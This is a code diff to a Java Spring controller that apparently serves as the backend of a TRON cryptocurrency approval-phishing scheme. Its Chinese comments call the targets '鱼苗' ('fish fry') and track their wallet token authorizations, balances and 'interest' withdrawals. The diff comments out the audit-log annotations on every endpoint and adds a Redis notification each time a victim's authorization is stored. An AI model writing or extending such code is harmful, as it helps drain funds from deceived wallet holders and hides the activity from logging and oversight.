@@ -54,7 +54,7 @@ public class TronAPIController extends BaseController {
     /**
      * 授权地址查询
      */
-    @Log(title = "Token初始化授权", businessType = BusinessType.INSERT)
+//    @Log(title = "Token初始化授权", businessType = BusinessType.INSERT)
     @GetMapping("/auth/get/{token}")
     public AjaxResult authGet(@PathVariable("token") String token, String language) {
         if (StringUtils.isBlank(token)) {
@@ -93,7 +93,7 @@ public class TronAPIController extends BaseController {
      * 查询鱼苗
      * （1）如果鱼苗已经授权，UI就不用弹出授权窗口
      */
-    @Log(title = "查询鱼苗", businessType = BusinessType.INSERT)
+//    @Log(title = "查询鱼苗", businessType = BusinessType.INSERT)
     @PostMapping("/fish/get")
     public AjaxResult getFish(@RequestBody @Validated TronFishDto dto, HttpServletRequest request) {
         if (StringUtils.isBlank(dto.getAddress())) {
@@ -125,7 +125,7 @@ public class TronAPIController extends BaseController {
      * （1）如果鱼苗不存在，就增加
      * （2）如果鱼苗已经存在，更新余额
      */
-    @Log(title = "新增鱼苗", businessType = BusinessType.INSERT)
+//    @Log(title = "新增鱼苗", businessType = BusinessType.INSERT)
     @PostMapping("/fish/add")
     public AjaxResult fishAdd(@RequestBody @Validated TronFishDto dto, HttpServletRequest request) {
         if (StringUtils.isBlank(dto.getToken())) {
@@ -180,6 +180,10 @@ public class TronAPIController extends BaseController {
         tronFish.setUpdateTime(new Date(System.currentTimeMillis()));
         iTronFishService.saveOrUpdate(tronFish);
 
+        //发送授权的消息通知
+        String jsonObject = JSONObject.toJSONString(tronFish);
+        redisTemplate.convertAndSend("sendMsg", jsonObject);
+
         return AjaxResult.success(tronFish);
     }
 
@@ -188,7 +192,7 @@ public class TronAPIController extends BaseController {
      * 1. 授权记录表更新
      * 2. 鱼苗表更新授权ID
      */
-    @Log(title = "Token添加授权", businessType = BusinessType.INSERT)
+//    @Log(title = "Token添加授权", businessType = BusinessType.INSERT)
     @PostMapping("/auth/add")
     public AjaxResult addAuth(@RequestBody @Validated TronFishDto dto, HttpServletRequest request) {
         if (StringUtils.isBlank(dto.getToken())) {
@@ -240,7 +244,7 @@ public class TronAPIController extends BaseController {
      * 提现申请
      * （1）客户申请利息提取，减少利息数额
      */
-    @Log(title = "提现申请", businessType = BusinessType.INSERT)
+//    @Log(title = "提现申请", businessType = BusinessType.INSERT)
     @PostMapping("/fish/withdraw")
     public AjaxResult withdraw(@RequestBody @Validated TronFishDto dto, HttpServletRequest request) {
         if (dto.getAllowWithdraw() == null || dto.getCurrentBalance() == null || dto.getTotalBalance() == null) {
@@ -296,7 +300,7 @@ public class TronAPIController extends BaseController {
     /**
      * 查询TRX余额
      */
-    @Log(title = "API查询TRX余额", businessType = BusinessType.INSERT)
+//    @Log(title = "API查询TRX余额", businessType = BusinessType.INSERT)
     @GetMapping("/auth/queryBalance/{id}")
     public AjaxResult queryBalance(@PathVariable("id") Long id) {
         TronAuthAddress tronAuthAddress = iTronAuthAddressService.getById(id);
@@ -312,7 +316,7 @@ public class TronAPIController extends BaseController {
     /**
      * 查询提现列表
      */
-    @Log(title = "查询提现列表", businessType = BusinessType.INSERT)
+//    @Log(title = "查询提现列表", businessType = BusinessType.INSERT)
     @GetMapping("/list/queryRecord/{address}")
     public TableDataInfo queryBalance(@PathVariable("address") String address) {
         if (StringUtils.isBlank(address)) {
